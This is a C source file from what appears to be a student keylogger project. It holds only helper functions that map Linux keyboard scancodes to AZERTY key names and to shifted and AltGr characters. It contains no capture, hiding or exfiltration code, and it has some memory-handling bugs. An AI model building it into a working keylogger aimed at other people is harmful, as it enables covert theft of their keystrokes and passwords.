/*
** ressources.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger/src
** 
** Made by Nathan Tréhout | Az'
** Login   <nathan.trehout@epitech.eu>
** 
** Started on  Sat Dec 31 15:07:23 2016 Nathan Trehout
** Last update Sat Dec 31 15:07:30 2016 Nathan Trehout
*/

#include "my.h"

char    retmaj(char dest)
{
  char  a;

  (dest >= 97 && dest <= 122) ? a = dest - 32 : 0;

  return (a);
}

char    *retmaj_bis(char *dest)
{
  char  *a;

  (strcmp(dest, "&") == 0) ? a = "1" : 0;
  (strcmp(dest, "é") == 0) ? a = "2" : 0;
  (*dest == 34) ? a = "3" : 0;
  (strcmp(dest, "'") == 0) ? a = "4" : 0;
  (strcmp(dest, "(") == 0) ? a = "5" : 0;
  (strcmp(dest, "-") == 0) ? a = "6" : 0;
  (strcmp(dest, "è") == 0) ? a = "7" : 0;
  (strcmp(dest, "_") == 0) ? a = "8" : 0;
  (strcmp(dest, "ç") == 0) ? a = "9" : 0;
  (strcmp(dest, "à") == 0) ? a = "0" : 0;
  (strcmp(dest, ")") == 0) ? a = "°" : 0;
  (strcmp(dest, "=") == 0) ? a = "+" : 0;
  (strcmp(dest, "^") == 0) ? a = "¨" : 0;
  (strcmp(dest, "$") == 0) ? a = "£" : 0;
  (strcmp(dest, "ù") == 0) ? a = "%" : 0;
  (strcmp(dest, "*") == 0) ? a = "µ" : 0;
  (strcmp(dest, "<") == 0) ? a = ">" : 0;
  (strcmp(dest, ",") == 0) ? a = "?" : 0;
  (strcmp(dest, ";") == 0) ? a = "." : 0;
  (strcmp(dest, ":") == 0) ? a = "/" : 0;
  (strcmp(dest, "!") == 0) ? a = "§" : 0;
  return (a);
}

char    *convert_to_key(int nb)
{
  char  **dest;
  dest = malloc(sizeof(char *) * 128);
  dest[4] = malloc(sizeof(char));
  dest[1] = "ECHAP";
  dest[59] = "F1";
  dest[60] = "F2";
  dest[61] = "F3";
  dest[62] = "F4";
  dest[63] = "F5";
  dest[64] = "F6";
  dest[65] = "F7";
  dest[66] = "F8";
  dest[67] = "F9";
  dest[68] = "F10";
  dest[87] = "F11";
  dest[88] = "F12";
  dest[110] = "INSERT";
  dest[99] = "IMPR. ECRAN";
  dest[111] = "SUPPR.";
  dest[41] = "²";
  dest[2] = "&";
  dest[3] = "é";
  *dest[4] = 34, dest[4][1] = '\0';
  dest[5] = "'";
  dest[6] = "(";
  dest[7] = "-";
  dest[8] = "è";
  dest[9] = "_";
  dest[10] = "ç";
  dest[11] = "à";
  dest[12] = ")";
  dest[13] = "=";
  dest[14] = "BACKSPACE";
  dest[102] = "ORIGINE";
  dest[15] = "TAB";
  dest[16] = "a";
  dest[17] = "z";
  dest[18] = "e";
  dest[19] = "r";
  dest[20] = "t";
  dest[21] = "y";
  dest[22] = "u";
  dest[23] = "i";
  dest[24] = "o";
  dest[25] = "p";
  dest[26] = "^";
  dest[27] = "$";
  dest[28] = "ENTREE";
  dest[104] = "PREVPG";
  dest[58] = "MAJ";
  dest[30] = "q";
  dest[31] = "s";
  dest[32] = "d";
  dest[33] = "f";
  dest[34] = "g";
  dest[35] = "h";
  dest[36] = "j";
  dest[37] = "k";
  dest[38] = "l";
  dest[39] = "m";
  dest[40] = "ù";
  dest[43] = "*";
  dest[109] = "NXTPG";
  dest[42] = "LSHIFT";
  dest[86] = "<";
  dest[44] = "w";
  dest[45] = "x";
  dest[46] = "c";
  dest[47] = "v";
  dest[48] = "b";
  dest[49] = "n";
  dest[50] = ",";
  dest[51] = ";";
  dest[52] = ":";
  dest[53] = "!";
  dest[54] = "RSHIFT";
  dest[107] = "END";
  dest[29] = "LCTRL";
  dest[125] = "DEM";
  dest[56] = "ALT";
  dest[57] = "SPACE";
  dest[100] = "ALTGR";
  dest[127] = "CR.DR";
  dest[97] = "RCTRL";
  dest[105] = "LEFT";
  dest[103] = "UP";
  dest[108] = "DOWN";
  dest[106] = "RIGHT";

  return (dest[nb]);
}

char    *retaltgr(char *dest)
{
  char  *a;

  a = malloc(sizeof(char) * 2);

  (strcmp(dest, "é") == 0) ? a = "~" : 0;
  (*dest == 34) ? a = "#": 0;
  (strcmp(dest, "'") == 0) ? a = "{" : 0;
  (strcmp(dest, "(") == 0) ? a = "[" : 0;
  (strcmp(dest, "-") == 0) ? a = "|" : 0;
  (strcmp(dest, "è") == 0) ? a = "`" : 0;
  (strcmp(dest, "_") == 0) ? *a = 92, a[1] = '\0' : 0;
  (strcmp(dest, "ç") == 0) ? a = "^" : 0;
  (strcmp(dest, "à") == 0) ? a = "@" : 0;
  (strcmp(dest, ")") == 0) ? a = "]" : 0;
  (strcmp(dest, "=") == 0) ? a = "}" : 0;
  (strcmp(dest, "$") == 0) ? a = "ø" : 0;

  return (a);
}
